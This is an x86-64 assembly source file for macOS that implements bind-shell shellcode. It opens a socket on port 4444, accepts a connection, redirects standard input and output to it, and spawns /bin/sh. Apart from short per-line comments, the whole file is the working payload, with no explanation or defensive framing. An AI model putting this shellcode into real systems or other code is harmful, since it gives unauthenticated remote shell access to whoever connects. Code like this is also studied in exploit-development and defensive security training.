BITS 64

section .text

global start

start:
  jmp runsh

start_shell:
    db '/bin//sh', 0

; socket(int domain, int type, int protocol) 
runsh:
  lea r14, [rel start_shell]  ; get address of shell
  mov rax, 0x2000061          ; call socket(AF_INET, SOCK_STREAM, 0)
  mov rdi, 2                  ; AF_NET = 2
  mov rsi, 1                  ; SOCK_STREAM = 1
  xor rdx, rdx                ; protocol, set to 0
  syscall
  mov r12, rax                ; save socket from call

sock_addr:
  xor r8, r8        ; clear the value of r8
  push r8           ; push r8 to the stack as it's null (INADDR_ANY = 0)
  push WORD 0x5C11  ; push our port number to the stack (Port = 4444)
  push WORD 2       ; push protocol argument to the stack (AF_INET = 2)
  mov r13, rsp      ; Save the sock_addr_in into r13

;bind
  mov rax, 0x2000068    ; bind(sockfd, sockaddr, addrleng);
  mov rdi, r12          ; sockfd from socket syscall
  mov rsi, r13          ; sockaddr 
  mov rdx, 0x10         ; addrleng the ip address length
  syscall

;listen
  mov rax, 0x200006A  ; int listen(sockfd, backlog);
  mov rdi, r12        ; sockfd
  xor rsi, rsi        ; backlog
  syscall

;accept
  mov rax, 0x200001E  ; int accept(sockfd, sockaddr, socklen);
  mov rdi, r12        ; sockfd
  xor rsi, rsi        ; sockaddr
  xor rdx, rdx        ; socklen
  syscall
  mov r12, rax        ; store fd in r12 to use in dup

dup:
; dup2 for stdin, stdout and stderr
  mov rax, 0x200005A          ; move the syscall for dup2 into rax
  mov rdi, r12                ; move the FD for the socket into rdi
  syscall                     ; call dup2(rdi, rsi)
 
  cmp rsi, 0x2                ; check to see if we are still under 2
  inc rsi                     ; inc rsi
  jbe dup                     ; jmp if less than 2

;execve
  mov rax, 0x200003B  ; execve(char *fname, char **argp, char **envp);  
  mov rdi, r14        ; set the address to shell
  push 0
  push r14
  mov rsi, rsp        
  xor rdx, rdx
  syscall

